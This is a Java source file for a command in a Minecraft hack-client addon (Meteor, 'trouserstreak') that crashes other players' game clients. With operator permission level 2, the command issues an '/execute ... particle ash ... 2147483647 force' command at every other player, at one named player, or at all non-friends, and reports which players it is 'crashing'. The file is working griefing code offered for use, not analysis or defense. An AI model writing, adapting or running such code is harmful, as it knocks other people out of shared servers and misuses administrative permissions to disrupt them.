package pwn.noobs.trouserstreak.commands;

import com.mojang.authlib.GameProfile;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.commands.arguments.PlayerListEntryArgumentType;
import meteordevelopment.meteorclient.systems.friends.Friends;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.command.CommandSource;
import net.minecraft.text.Text;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

public class CrashCommand extends Command {
    public CrashCommand() {
        super("crash", "Crash players, requires permission level 2 or higher");
    }

    private CopyOnWriteArrayList<PlayerListEntry> players;

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(ctx -> {
            players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
            if (players.size() <= 1) {
                error("No other players found on the server");
                return SINGLE_SUCCESS;
            }
            if (mc.player.getPermissionLevel() >= 2) {
                ChatUtils.sendPlayerMsg("/execute at @a[name=!" + mc.player.getName().getLiteralString()
                        + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!"
                        + mc.player.getName().getLiteralString() + "]");
                StringBuilder playerNames = new StringBuilder("Crashing players: ");
                for (PlayerListEntry player : players) {
                    if (!player.getProfile().getId().equals(mc.player.getGameProfile().getId())) {
                        playerNames.append(player.getProfile().getName()).append(", ");
                    }
                }
                playerNames.setLength(playerNames.length() - 2); // Remove the extra comma and space at the end
                ChatUtils.sendMsg(Text.of(playerNames.toString()));
                return SINGLE_SUCCESS;
            } else if (mc.player.getPermissionLevel() < 2)
                error("Must have permission level 2 or higher");
            return SINGLE_SUCCESS;
        });
        builder.then(argument("player", PlayerListEntryArgumentType.create()).executes(context -> {
            GameProfile profile = PlayerListEntryArgumentType.get(context).getProfile();
            if (profile != null) {
                if (mc.getNetworkHandler().getPlayerList().stream()
                        .anyMatch(player -> player.getProfile().getId().equals(profile.getId()))) {
                    if (mc.player.getPermissionLevel() >= 2) {
                        ChatUtils.sendPlayerMsg("/execute at " + profile.getName()
                                + " run particle ash ~ ~ ~ 1 1 1 1 2147483647 force " + profile.getName());
                        ChatUtils.sendMsg(Text.of("Crashing player: " + profile.getName()));
                    } else if (mc.player.getPermissionLevel() < 2)
                        error("Must have permission level 2 or higher");
                } else {
                    error("Player not found in the current server");
                }
            } else {
                error("Player profile not found");
            }
            return SINGLE_SUCCESS;
        }));
        builder.then(literal("@allNonFriends").executes(ctx -> {
            players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
            if (players.size() <= 1) {
                error("No other players found on the server");
                return SINGLE_SUCCESS;
            }
            if (mc.player.getPermissionLevel() >= 2) {
                List<String> friendNames = new ArrayList<>();
                friendNames.add("name=!" + mc.player.getName().getLiteralString());
                for(PlayerListEntry player : players) {
                    if(Friends.get().isFriend(player)) friendNames.add("name=!" + player.getProfile().getName());
                }
                String friendsString = String.join(",", friendNames);
                String thecommand = "/execute at @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + friendsString + "]";
                if (thecommand.length()<=256){
                    ChatUtils.sendPlayerMsg(thecommand);
                    StringBuilder playerNames = new StringBuilder("Crashing players (non-friends): ");
                    for (PlayerListEntry player : players) {
                        if (!player.getProfile().getId().equals(mc.player.getGameProfile().getId()) && !Friends.get().isFriend(player)) {
                            playerNames.append(player.getProfile().getName()).append(", ");
                        }
                    }
                    playerNames.setLength(playerNames.length() - 2); // Remove the extra comma and space at the end
                    ChatUtils.sendMsg(Text.of(playerNames.toString()));
                }
                else {
                    error("Crash all players command is too long, you have too many friends online.");
                }
                return SINGLE_SUCCESS;
            } else if (mc.player.getPermissionLevel() < 2)
                error("Must have permission level 2 or higher");
            return SINGLE_SUCCESS;
        }));
    }
}